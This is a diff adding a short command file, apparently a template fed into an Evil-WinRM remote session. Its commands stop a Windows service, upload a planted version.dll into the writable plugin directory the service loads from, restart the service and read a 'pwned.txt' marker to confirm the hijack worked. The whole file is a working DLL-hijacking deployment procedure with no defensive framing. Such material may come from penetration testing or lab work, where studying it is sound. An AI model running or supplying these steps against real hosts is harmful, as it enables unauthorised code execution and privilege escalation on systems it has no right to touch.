@@ -1,0 +1,17 @@
+# Template for an Evil-WinRM session (adjust paths before use).
+# Usage:
+#   evil-winrm -i <host> -u '<domain>\<user>' -p '<pass>' < deploy.cmds
+#
+# Replace PLUGIN_DIR with the writable directory the target service loads
+# its plugin from, and version.dll with the name your build produces.
+
+dir PLUGIN_DIR
+sc.exe qc <SERVICE_NAME>
+sc.exe stop <SERVICE_NAME>
+upload version.dll PLUGIN_DIR/version.dll
+dir PLUGIN_DIR
+sc.exe start <SERVICE_NAME>
+Start-Sleep -Seconds 4
+sc.exe query <SERVICE_NAME>
+type PLUGIN_DIR/pwned.txt
+exit
